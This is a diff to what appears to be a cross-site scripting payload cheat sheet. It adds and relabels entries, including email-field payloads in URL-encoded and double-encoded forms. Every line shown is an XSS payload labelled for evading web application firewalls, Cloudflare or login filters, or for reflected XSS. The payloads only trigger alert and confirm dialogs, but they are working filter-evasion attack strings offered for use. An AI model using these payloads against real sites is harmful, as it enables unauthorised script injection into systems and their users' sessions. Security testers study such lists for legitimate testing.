@@ -22,7 +22,9 @@ Please do visit as well: https://github.com/s0md3v/AwesomeXSS
 <details/open=/Open/href=/data=+ontoggle="(alert)(document.domain)
 <details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)                --> Helps bypass
 <svg%20onx=()%20onload=(confirm)(document.domain)>                                 --> WAF Bypass
-["');alert('XSS');//"]@gmail.com                                                   --> WAF Bypass (Login)
+["');alert('XSS');//"]@gmail.com                                                   --> Login Email (WAF Bypass)
+test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E                              --> Best Email XSX
+test@gmail.com%2527%5C%2522%253E%253Csvg%2Fonload%3Dalert%28%2Fxss%2F%29%253E      --> Double Encoding the uppper payload
 "><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>        --> Cloudflare xss bypass 
 https://xxx.com/path/"><script>alert(1)</script>                                   --> Sometime do add additional parameters like path in this sense and then payload forreflected XSS
 abc`;return false});});alert`xss`;</script>                                        --> For reflected XSS
